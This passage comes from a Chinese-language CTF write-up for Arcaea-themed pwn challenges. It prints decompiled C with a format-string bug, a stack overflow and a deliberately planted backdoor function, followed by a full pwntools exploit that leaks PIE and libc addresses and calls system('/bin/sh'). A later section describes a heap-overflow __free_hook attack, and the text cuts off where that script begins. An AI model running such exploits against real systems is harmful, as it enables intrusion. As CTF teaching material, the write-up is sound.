&amp;argc;</span><br><span class=\"line\">  v10 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v9 = <span class=\"built_in\">malloc</span>(<span class=\"number\">0xC</span>u);</span><br><span class=\"line\">  init();</span><br><span class=\"line\">  hello();</span><br><span class=\"line\">  *((_DWORD *)v9 + <span class=\"number\">2</span>) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;I would like to know your complete PTT (Potential Value), would it be convenient for you to tell me?&quot;</span>);</span><br><span class=\"line\">  fflush(<span class=\"built_in\">stdin</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%f&quot;</span>, &amp;v8, v5, v6);</span><br><span class=\"line\">  compare(*(<span class=\"type\">float</span> *)&amp;v8);</span><br><span class=\"line\">  <span class=\"keyword\">do</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;=======Please select the following options to use the relevant functions========&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;1. If the score is qualified, it will be stored in B30&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;2. Calculate single PTT&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;3. Calculate player PTT through b30&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;4. Give your favorite song a vote&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;5. View voted songs&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;6. Output all content of b30&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;7. Exit the system&quot;</span>);</span><br><span class=\"line\">    fflush(<span class=\"built_in\">stdin</span>);</span><br><span class=\"line\">    v8 = &amp;v7;</span><br><span class=\"line\">    ((<span class=\"type\">void</span> (__stdcall *)(<span class=\"type\">const</span> <span class=\"type\">char</span> *))__isoc99_scanf)(<span class=\"string\">&quot;%d&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> ( v7 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        setB30(v9);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">        calculateMusic(v9, <span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">        v3 = pttCalculate(v9);</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Your PTT is%f\\n&quot;</span>, (<span class=\"type\">double</span>)v3);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">4</span>:</span><br><span class=\"line\">        vote();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">5</span>:</span><br><span class=\"line\">        output_vote(p_argc);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">6</span>:</span><br><span class=\"line\">        test(v9);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">7</span>:</span><br><span class=\"line\">        v10 = <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">default</span>:</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( v10 != <span class=\"number\">1</span> );</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Exit the program&quot;</span>);</span><br><span class=\"line\">  freeNode(v9);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Exit successful&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Thank you for using this scoring system&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;See you&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t找了一圈，最后在 output_vote 函数里找到了一个 printf (dest)：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">output_vote</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> dest[<span class=\"number\">68</span>]; <span class=\"comment\">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !votes )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;You haven&#x27;t voted yet\\n&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;The name of the song you voted for is:&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">strcpy</span>(dest, name);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">printf</span>(dest);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t这个可以用来泄露 main 的地址，绕过 PIE，关键是 strcpy，存在 name 这个变量，但是上面没定义，因为在 bss 段上，根据这个变量，看看哪里调用了它，最后在 vote 里调用了两次：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">vote</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( votes &gt; <span class=\"number\">2</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;You have already cast 3 times, you cannot cast anymore&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;If you still want to vote, I suggest restarting this system, as it doesn&#x27;t have a memory function anyway &quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;You can vote for what you like. You can input the name of your favorite song and cast your valuable vote&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(</span><br><span class=\"line\">      <span class=\"string\">&quot;You can  vote 3 times, you can vote other songs, and you can&#x27;t vote for the same song again. There won&#x27;t be any pr&quot;</span></span><br><span class=\"line\">      <span class=\"string\">&quot;oblems if you vote, anyway, it&#x27;s useless to vote (=_=!!!)&quot;</span>);</span><br><span class=\"line\">    fflush(<span class=\"built_in\">stdin</span>);</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, &amp;name, <span class=\"number\">0x60</span>u);</span><br><span class=\"line\">    fflush(<span class=\"built_in\">stdin</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(</span><br><span class=\"line\">      <span class=\"string\">&quot;Your vote was for %s. Thank you for your affirmation of this spectrum, and I hope you can score smoothly\\n&quot;</span>,</span><br><span class=\"line\">      &amp;name);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ++votes;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t这里有个 read：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">read(<span class=\"number\">0</span>, &amp;name, <span class=\"number\">0x60</span>u);</span><br></pre></td></tr></table></figure>\n<p>​\t\t回去一下，output_vote 函数中，将 name 变量塞进了 dest 里，但 dest 似乎不够大，存在栈溢出，但 gdb 调一下之后，发现其实长度不是特别大，不够 ROP（可能稍微大了，不过懒得改了），这里就可以打栈迁移了，随意，不过，预期解是 libc，常规 libc，因为多找找，能找到这个函数：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ssize_t</span> <span class=\"title function_\">evaluate</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// [esp-8h] [ebp-150h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// [esp-4h] [ebp-14Ch]</span></span><br><span class=\"line\">  <span class=\"type\">size_t</span> nbytes; <span class=\"comment\">// [esp+Ch] [ebp-13Ch] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v4[<span class=\"number\">256</span>]; <span class=\"comment\">// [esp+10h] [ebp-138h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">52</span>]; <span class=\"comment\">// [esp+110h] [ebp-38h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;You cannot call this function unless you have authorization&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;So?How are you?&quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x30</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"built_in\">strcmp</span>(buf, <span class=\"string\">&quot;g01den&quot;</span>) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;NO,you can&#x27;t do it&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;OK,Only I can give myself advice&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;plz input the count of your advice&quot;</span>);</span><br><span class=\"line\">  fflush(<span class=\"built_in\">stdin</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%d&quot;</span>, &amp;nbytes, v1, v2);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">int</span>)nbytes &gt; <span class=\"number\">256</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;No ,don&#x27;t hack&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  fflush(<span class=\"built_in\">stdin</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> read(<span class=\"number\">0</span>, v4, nbytes);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t这个函数是我预留的一个后门算是后门吧，想办法劫持数据流过来吧，不过得先泄露 main。</p>\n<p>​\t\tmain 的某个偏移是 <code>%23$p</code> ，这里泄露出来的是这个地址：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0000146A                 call    output_vote     ; jumptable 00001414 case 5</span><br><span class=\"line\">.text:0000146F                 jmp     short _L3       ; jumptable 00001414 default case, case 0</span><br></pre></td></tr></table></figure>\n<p>​\t\t之后真实地址减去偏移得到了 elf 的基地址，之后就可以拿到 evaluate 的地址和其他 plt 和 got 表的地址，之后就常规的 libc3 了。泄露 puts 真实地址，然后获得 libc_base 地址，之后拿 binsh 和 system。</p>\n<p>​\t\texp：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span></span><br><span class=\"line\">Locale = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> Locale == <span class=\"number\">1</span>:</span><br><span class=\"line\">    io = process(<span class=\"string\">&#x27;./pwn&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    io = remote(<span class=\"string\">&quot;154.64.254.169&quot;</span>,<span class=\"number\">33185</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\"># context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exp</span>():</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">b&quot;I would like to know your complete PTT (Potential Value), would it be convenient for you to tell me?&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">b&quot;11.0&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">b&quot;7. Exit the system\\n&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">b&quot;4&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">b&quot;problems if you vote, anyway, it&#x27;s useless to vote (=_=!!!)&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">b&quot;AAAAAAAA%23$p&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">b&quot;7. Exit the system&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">b&quot;5&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">b&quot;AAAAAAAA&quot;</span>)</span><br><span class=\"line\">    main_146F = io.recv(<span class=\"number\">10</span>)</span><br><span class=\"line\">    main_addr = <span class=\"built_in\">hex</span>(<span class=\"built_in\">int</span>(main_146F,<span class=\"number\">16</span>) - <span class=\"number\">456</span>)</span><br><span class=\"line\">    log.success(<span class=\"string\">&quot;main_146F = &quot;</span> + <span class=\"built_in\">str</span>(main_146F.decode()))</span><br><span class=\"line\">    log.success(<span class=\"string\">&quot;main_addr = &quot;</span> + <span class=\"built_in\">str</span>(main_addr))</span><br><span class=\"line\">    </span><br><span class=\"line\">    offset = <span class=\"number\">0x4c</span></span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">b&quot;7. Exit the system\\n&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">b&quot;4&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">b&quot;problems if you vote, anyway, it&#x27;s useless to vote (=_=!!!)&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    main_addr = <span class=\"built_in\">int</span>(main_addr,<span class=\"number\">16</span>)</span><br><span class=\"line\">    backdoor = main_addr + <span class=\"number\">0x1DDE</span> - <span class=\"number\">0x12A7</span></span><br><span class=\"line\">    payload = <span class=\"string\">b&quot;a&quot;</span> * offset + p32(backdoor)</span><br><span class=\"line\">    io.sendline(payload)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">b&quot;7. Exit the system\\n&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">b&quot;5&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">b&quot;So?How are you?&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">b&quot;g01den\\x00&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">b&quot;plz input the count of your advice\\n&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">b&quot;-1&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    base = main_addr - elf.symbols[<span class=\"string\">&quot;main&quot;</span>]</span><br><span class=\"line\">    puts_plt = base + elf.symbols[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">    puts_got = base + elf.got[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">    log.success(<span class=\"string\">&quot;main_add = &quot;</span> + <span class=\"built_in\">str</span>(<span class=\"built_in\">hex</span>(main_addr)))</span><br><span class=\"line\">    log.success(<span class=\"string\">&quot;puts_plt = &quot;</span> + <span class=\"built_in\">str</span>(<span class=\"built_in\">hex</span>(puts_plt)))</span><br><span class=\"line\">    log.success(<span class=\"string\">&quot;elf_base = &quot;</span> + <span class=\"built_in\">str</span>(<span class=\"built_in\">hex</span>(base)))</span><br><span class=\"line\">    log.success(<span class=\"string\">&quot;puts_got = &quot;</span> + <span class=\"built_in\">str</span>(<span class=\"built_in\">hex</span>(puts_got)))</span><br><span class=\"line\">    </span><br><span class=\"line\">    offset = <span class=\"number\">0x13c</span></span><br><span class=\"line\">    ret = base + <span class=\"number\">0x100e</span></span><br><span class=\"line\">    <span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\">    <span class=\"comment\"># pause()</span></span><br><span class=\"line\">    global_offset_table_addr = base + <span class=\"number\">0x5000</span><span class=\"comment\">#0x4fa0</span></span><br><span class=\"line\">    log.success(<span class=\"string\">&quot;global_offset_table_addr = &quot;</span> + <span class=\"built_in\">str</span>(<span class=\"built_in\">hex</span>(global_offset_table_addr)))</span><br><span class=\"line\">    payload1 = (offset -<span class=\"number\">8</span>) * <span class=\"string\">b&quot;a&quot;</span> + p32(global_offset_table_addr) + p32(global_offset_table_addr) + p32(ret) + p32(puts_plt) + p32(backdoor) + p32(puts_got)</span><br><span class=\"line\">    <span class=\"comment\"># payload1 = offset * b&quot;a&quot; + p32(ret) + p32(main_addr)</span></span><br><span class=\"line\">    <span class=\"comment\"># payload1 = offset * b&quot;a&quot; + p32(ret) + p32(main_addr) </span></span><br><span class=\"line\">    io.sendline(payload1)</span><br><span class=\"line\"></span><br><span class=\"line\">    puts_addr = u32(io.recv(<span class=\"number\">4</span>))</span><br><span class=\"line\">    log.success(<span class=\"string\">&quot;puts_addr = &quot;</span> + <span class=\"built_in\">str</span>(<span class=\"built_in\">hex</span>(puts_addr)))</span><br><span class=\"line\">    libc_base = puts_addr - libc.symbols[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">    log.success(<span class=\"string\">&quot;libc_base = &quot;</span> + <span class=\"built_in\">str</span>(<span class=\"built_in\">hex</span>(libc_base)))</span><br><span class=\"line\">    system_addr = libc_base + libc.symbols[<span class=\"string\">&quot;system&quot;</span>]</span><br><span class=\"line\">    log.success(<span class=\"string\">&quot;system_addr = &quot;</span> + <span class=\"built_in\">str</span>(<span class=\"built_in\">hex</span>(system_addr)))</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">b&quot;So?How are you?\\n&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">b&quot;g01den\\x00&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">b&quot;plz input the count of your advice\\n&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">b&quot;-1&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    binsh_addr = libc_base + <span class=\"built_in\">next</span>(libc.search(<span class=\"string\">&quot;/bin/sh&quot;</span>))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(binsh_addr))</span><br><span class=\"line\">    log.success(<span class=\"string\">&quot;binsh_addr = &quot;</span> + <span class=\"built_in\">str</span>(<span class=\"built_in\">hex</span>(binsh_addr)))</span><br><span class=\"line\">    payload2 = (offset -<span class=\"number\">8</span>) * <span class=\"string\">b&quot;a&quot;</span> + p32(global_offset_table_addr) + p32(global_offset_table_addr) + p32(ret)</span><br><span class=\"line\">    payload2 += p32(system_addr) + p32(binsh_addr) + p32(binsh_addr) + p32(binsh_addr)</span><br><span class=\"line\">    </span><br><span class=\"line\">    gdb.attach(io)</span><br><span class=\"line\">    pause()</span><br><span class=\"line\"></span><br><span class=\"line\">    io.sendline(payload2)</span><br><span class=\"line\"></span><br><span class=\"line\">exp()</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<p>​\t\t这里 payload2 的 <code>p32(global_offset_table_addr) + p32(global_offset_table_addr)</code>  有点儿问题，不是我的 exp 的问题，是我最开始本地调题目的时候出现的问题，我发现它这里如果不泄露这个地址的话就打不通，但为啥现在不需要这个都能出，有点过于随缘了，如果不加上这个地址不通的话， 那就考虑 gdb 调一下看看是否这里缺失了什么，或者寄存器之类的问题（补充，这里出现问题是因为再 call puts 的 plt 的时候，出现了问题，有个存在 ebp-4 的地址给 mov 到了 ebx 寄存器中，同时，存在 jmp ebp+XX 相关代码，动调的时候，发现报错地址是 aaaa，所以改成 <code>p32(global_offset_table_addr) + p32(global_offset_table_addr)</code>  就能打通）。</p>\n<h3 id=\"arcaea_sorting_revenge\"><a class=\"markdownIt-Anchor\" href=\"#arcaea_sorting_revenge\">#</a> Arcaea_Sorting_Revenge：</h3>\n<p>​\t\t似乎出了个板子题，不过，我也算是尽力了吧，堆这玩意儿是真的难。</p>\n<p>​\t\t程序做了个简单的存储功能，arcaea 存储分数并输出的功能，删除功能里会将 bss 段里的当前指针置零，但是歌曲信息那个 chunk 里面，指向 description 的指针没有置零，edit 修改了输入的长度，但是没有重新 malloc 新的空间，没有检测大小，存在堆溢出，增加功能里一次 malloc 了两次 chunk，第二次可以控制大小。</p>\n<p>​\t\t首先增加三次书，每次都是，控制 size 大小为 0x91，保证 chunk 在被 free 的时候能进 unsortedbin，free 掉编号为 1 的这个音乐，然后重新建一个歌曲，为了让 chunk 里有 unsortedbin 里的数据，也就是 fd 或者 bk 指针，因为 unsortedbin 目前只有一个 chunk，所以 fd，bk 指针均指向 main_arena，可以用来 leak 掉 libc 地址，重新 add 了一个之后，编号依旧为 1，然后写入的 content 为八个字节，不要写入其他内容，之后 show 可以 leak 出 libc 地址，之后为了 leak 堆的地址，我 free 了两次，但是实际上并不需要这么做，之后就是利用 edit 的溢出功能，在堆上修改 chunk，达成伪造，伪造指针，指向任意地址，这里指向 <code>__free_hook</code> ，然后 edit 修改 <code>__free_hook</code>  为 <code>one_gadget</code>  的地址，然后进行 getshell。</p>\n<p>​\t\t算是个比较板子的堆题吧。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span 